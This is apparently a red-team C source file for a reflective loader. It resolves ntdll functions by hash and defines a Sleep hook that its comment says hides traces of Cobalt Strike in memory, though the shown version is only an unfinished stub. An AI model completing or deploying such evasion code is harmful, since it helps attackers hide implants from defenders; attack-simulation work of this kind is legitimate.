/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

NTSTATUS
NTAPI
RtlCreateTimerQueue(
	_In_ PHANDLE NewTimerQueue
);

typedef struct
{
	D_API( RtlInitUnicodeString );
	D_API( RtlCreateTimerQueue );
	D_API( RtlCreateTimer );
	D_API( NtCreateEvent );
	D_API( LdrUnloadDll );
	D_API( LdrLoadDll );
	D_API( NtContinue );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_RTLCREATETIMERQUEUE	0x50ef3c31 /* RtlCreateTimerQueue */
#define H_API_RTLCREATETIMER		0x1877faec /* RtlCreateTimer */
#define H_API_NTCREATEEVENT		0x28d3233d /* NtCreateEvent */
#define H_API_NTCONTINUE		0xfc3a6c2c /* NtContinue */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Uses NightHawk's Obfuscate/Sleep implementation to
 * hide traces of Cobalt Strike in memory. Temporary 
 * version.
 *
!*/
D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
{
	API	Api;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.RtlCreateTimerQueue = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
	Api.RtlCreateTimer      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMER );
	Api.NtCreateEvent       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.NtContinue          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
